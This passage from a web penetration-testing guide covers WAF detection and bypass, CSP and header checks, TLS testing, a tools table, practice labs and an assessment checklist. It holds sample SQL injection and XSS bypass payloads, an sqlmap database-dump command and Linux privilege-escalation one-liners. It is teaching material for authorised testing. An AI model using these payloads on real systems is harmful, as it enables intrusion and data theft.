6. Appendix
   - Raw tool output (nmap, nuclei, nikto scans)
   - Full request/response dumps from Burp
   - Additional screenshots
```

---

## Part 8 — Security Controls and Defences

Understanding what you are supposed to be testing helps you know what to look for.

## Web Application Firewall (WAF)

A WAF sits in front of the web app and blocks malicious requests (SQLi, XSS payloads, path traversal).

**Detect a WAF:**

```bash
wafw00f https://target.com     # identifies WAF vendor
# Common: Cloudflare, AWS WAF, Akamai, Imperva, F5

# WAF bypass techniques:
# Encoding: URL encode the payload
' OR 1=1--  →  %27%20OR%201%3D1--

# Case variation (some WAFs are case-sensitive)
<ScRiPt>alert(1)</ScRiPt>

# Unicode/HTML encoding
&#x27; OR &#x31;=&#x31;--

# Whitespace substitution
SELECT/**/username/**/FROM/**/users
```

## Content Security Policy (CSP)

CSP is an HTTP header that tells the browser which scripts are allowed to execute. A strict CSP largely prevents XSS.

```bash
# Check if CSP is set
curl -I https://target.com | grep -i content-security-policy

# Weak CSP indicators:
Content-Security-Policy: default-src *           # wildcard — useless
Content-Security-Policy: script-src 'unsafe-inline'  # allows inline scripts — XSS possible
# No CSP header at all — XSS fully exploitable
```

## Security Headers (Quick Checklist)

Every web app should have these headers. Missing ones are findings:

| Header                      | Purpose                   | Correct Value                         |
| --------------------------- | ------------------------- | ------------------------------------- |
| `Content-Security-Policy`   | Prevent XSS               | Strict policy, no `unsafe-inline`     |
| `X-Frame-Options`           | Prevent clickjacking      | `DENY` or `SAMEORIGIN`                |
| `X-Content-Type-Options`    | Prevent MIME sniffing     | `nosniff`                             |
| `Strict-Transport-Security` | Force HTTPS               | `max-age=31536000; includeSubDomains` |
| `Referrer-Policy`           | Limit referrer leakage    | `no-referrer` or `strict-origin`      |
| `Permissions-Policy`        | Restrict browser features | Disable unused APIs                   |

```bash
# Check all security headers at once
curl -I https://target.com
# Or use: https://securityheaders.com
```

## TLS / SSL Vulnerabilities

```bash
# testssl.sh — comprehensive TLS analysis
./testssl.sh https://target.com

# What to look for:
# ✗ SSLv2, SSLv3, TLS 1.0, TLS 1.1 — deprecated, must be disabled
# ✗ Weak ciphers: RC4, DES, 3DES, NULL ciphers
# ✗ BEAST, POODLE, HEARTBLEED, ROBOT vulnerabilities
# ✓ TLS 1.2 minimum, TLS 1.3 preferred
# ✓ Forward secrecy (ECDHE cipher suites)
```

---

## Part 9 — Tools Reference (Complete)

## By Category

| Category              | Tool         | Platform | Key Use                  | Cost               |
| --------------------- | ------------ | -------- | ------------------------ | ------------------ |
| **Proxy / Intercept** | Burp Suite   | All      | Web app testing          | Free / Pro $450/yr |
| **Network Scanner**   | Nmap         | All      | Port/service scanning    | Free               |
| **Web Scanner**       | Nuclei       | All      | CVE/config scanning      | Free               |
| **Web Scanner**       | Nikto        | All      | Basic web checks         | Free               |
| **Fuzzer**            | ffuf         | All      | Path/param fuzzing       | Free               |
| **Fuzzer**            | gobuster     | All      | Dir brute force          | Free               |
| **SQLi**              | sqlmap       | All      | Automated SQL injection  | Free               |
| **Brute Force**       | Hydra        | All      | Credential attacks       | Free               |
| **Password Crack**    | Hashcat      | All      | Offline hash cracking    | Free               |
| **Exploitation**      | Metasploit   | All      | Known exploit framework  | Free               |
| **Recon**             | subfinder    | All      | Subdomain discovery      | Free               |
| **Recon**             | amass        | All      | Subdomain + OSINT        | Free               |
| **Recon**             | theHarvester | All      | Email/domain OSINT       | Free               |
| **Recon**             | Shodan       | Web      | Internet device search   | Free / Paid        |
| **Privesc**           | LinPEAS      | Linux    | Automated privesc checks | Free               |
| **Privesc**           | WinPEAS      | Windows  | Automated privesc checks | Free               |
| **Windows**           | CrackMapExec | Linux    | AD/SMB lateral movement  | Free               |
| **Windows**           | Impacket     | Linux    | Windows protocol attacks | Free               |
| **TLS**               | testssl.sh   | Linux    | TLS vulnerability scan   | Free               |
| **WAF**               | wafw00f      | All      | WAF detection            | Free               |
| **OS**                | Kali Linux   | —        | All tools pre-installed  | Free               |

## Essential Wordlists (SecLists)

```bash
# Install SecLists
git clone https://github.com/danielmiessler/SecLists /usr/share/seclists

# Key lists:
/usr/share/seclists/Discovery/Web-Content/common.txt          # common paths
/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt
/usr/share/seclists/Discovery/DNS/subdomains-top1million.txt  # subdomain brute force
/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt    # passwords
/usr/share/seclists/Fuzzing/SQLi/                             # SQLi payloads
/usr/share/seclists/Fuzzing/XSS/                              # XSS payloads
/usr/share/seclists/Usernames/top-usernames-shortlist.txt     # common usernames
```

---

---

## Appendix — Preventing crawlers and AI models from indexing a folder

If you need to keep a folder off public indexes and discourage automated crawlers or models from reading it, use one or more of these practical controls. None are a guaranteed defence against hostile crawlers; for sensitive content require authentication or keep it off public hosting.

- robots.txt (advisory): add a `Disallow` rule for the folder at the site root

```text
User-agent: *
Disallow: /private-folder/
```

- HTML meta tag: add to the page head to prevent indexing by browsers and well-behaved crawlers

```html
<meta name="robots" content="noindex, nofollow" />
```

- HTTP header (server side): useful for binary files or responses without HTML

Nginx example:

```nginx
add_header X-Robots-Tag "noindex, nofollow";
```

Apache example:

```apache
Header set X-Robots-Tag "noindex, nofollow"
```

- Static-site tools: for Hugo add the meta tag in your head partial or set a page param and render the `noindex` meta from your layout. For files served directly create an index.html with the meta tag and route access through authentication when needed.

Notes:

- `robots.txt`, `meta` and `X-Robots-Tag` are advisory; some crawlers or data collectors ignore them
- For true confidentiality restrict access with authentication, remove the content from public buckets, or host it on a private network

# Part 10 — Practice Labs and Learning Path

## Recommended Learning Path (Developer Background)

```
Month 1 — Web App Foundations
  └── PortSwigger Web Academy (all free labs)
       ├── SQL Injection
       ├── XSS
       ├── CSRF
       ├── SSRF
       ├── XXE
       └── Access Control / IDOR

Month 2 — Tools and Hands-On
  └── TryHackMe — "Jr Penetration Tester" learning path
  └── Set up DVWA locally (Docker: docker run --rm -it -p 80:80 vulnerables/web-dvwa)
  └── Install Burp Suite, work through all DVWA modules with it

Month 3 — Real Machines
  └── HackTheBox (starting point machines: "very easy" tier)
  └── VulnHub downloadable VMs

Month 4 — API Security
  └── OWASP crAPI (vulnerable API practice environment)
  └── Portswigger API testing labs
  └── Test your own application's API

Ongoing
  └── Follow: @PortSwigger, @OWASP, @hackthebox_eu on Twitter/X
  └── Read: "The Web Application Hacker's Handbook" (Stuttard)
  └── Read: "Hacking: The Art of Exploitation" (Erickson)
```

## Practice Environments

| Platform                    | URL                          | Type              | Level                   |
| --------------------------- | ---------------------------- | ----------------- | ----------------------- |
| **PortSwigger Web Academy** | portswigger.net/web-security | Web app labs      | Beginner → Advanced     |
| **TryHackMe**               | tryhackme.com                | Guided paths      | Beginner → Intermediate |
| **HackTheBox**              | hackthebox.com               | CTF machines      | Intermediate → Expert   |
| **DVWA**                    | github.com/digininja/DVWA    | Local web app     | Beginner                |
| **WebGoat**                 | owasp.org/WebGoat            | Local web app     | Beginner → Intermediate |
| **OWASP crAPI**             | github.com/OWASP/crAPI       | API security      | Intermediate            |
| **VulnHub**                 | vulnhub.com                  | Downloadable VMs  | All levels              |
| **PentesterLab**            | pentesterlab.com             | Web + code review | Beginner → Advanced     |

## Certifications (if pursuing professional pentesting)

| Cert     | Issuer       | Focus                                    | Difficulty   |
| -------- | ------------ | ---------------------------------------- | ------------ |
| **eJPT** | INE          | Entry-level pentesting                   | Beginner     |
| **PNPT** | TCM Security | Practical, no MCQ                        | Intermediate |
| **OSCP** | OffSec       | Gold standard, 24hr exam                 | Hard         |
| **CEH**  | EC-Council   | Theory-heavy, less respected technically | Intermediate |
| **BSCP** | PortSwigger  | Burp Suite / web app                     | Intermediate |

---

# Quick Reference Card

## Common One-Liners

```bash
# Full nmap scan and save
nmap -sV -sC -p- -T4 target.com -oA nmap_full

# Quick web recon
whatweb target.com && nikto -h target.com && gobuster dir -u target.com -w common.txt

# Find subdomains
subfinder -d target.com | dnsx -silent | httpx -silent > live_subdomains.txt

# Scan live subdomains for CVEs
nuclei -l live_subdomains.txt -t cves/ -severity critical,high

# Extract all links from a site
katana -u https://target.com -o links.txt

# Check security headers
curl -I https://target.com 2>/dev/null | grep -iE "(strict|content-security|x-frame|x-content)"

# SQLi test on a parameter
sqlmap -u "https://target.com/?id=1" --batch --dbs

# Find SUID binaries (Linux privesc)
find / -perm -4000 -type f 2>/dev/null

# Check sudo permissions
sudo -l 2>/dev/null
```

## Checklist: Web App Assessment

```
Reconnaissance
  [ ] Subdomain enumeration
  [ ] Tech stack fingerprinting
  [ ] Google dorks for exposed files/panels
  [ ] Shodan/Censys for infrastructure

Scanning
  [ ] Nmap full port scan
  [ ] Nikto + Nuclei scan
  [ ] Directory/endpoint bruteforce
  [ ] Spider site with Burp / katana

Authentication
  [ ] Default credentials tried
  [ ] Username enumeration (different error messages)
  [ ] Password policy / lockout tested
  [ ] MFA bypass (token reuse, null value, 000000)
  [ ] JWT algorithm confusion / weak secret

Authorisation
  [ ] IDOR (change IDs in every request)
  [ ] Horizontal privilege escalation (access other users' data)
  [ ] Vertical privilege escalation (access admin functions as user)
  [ ] Unauthenticated access to authenticated endpoints

Injection
  [ ] SQL injection on all parameters
  [ ] XSS on all input fields
  [ ] XXE in XML requests
  [ ] SSTI in template-like inputs
  [ ] Command injection on system-like functions
  [ ] SSRF on URL parameters

Session Management
  [ ] Session token entropy (is it random?)
  [ ] Session invalidated on logout?
  [ ] Session fixation possible?
  [ ] CSRF on state-changing actions?

Sensitive Data
  [ ] HTTPS enforced everywhere?
  [ ] Security headers present?
  [ ] Sensitive data in URLs (logs capture these)
  [ ] Sensitive data in JavaScript source / comments?
  [ ] API keys or secrets in client-side code?

Misconfiguration
  [ ] Directory listing enabled?
  [ ] Debug mode / verbose errors?
  [ ] Unnecessary HTTP methods (PUT, DELETE, TRACE)?
  [ ] Outdated components (check against CVEs)?
  [ ] Backup files accessible (.bak, .old, .zip)?
```
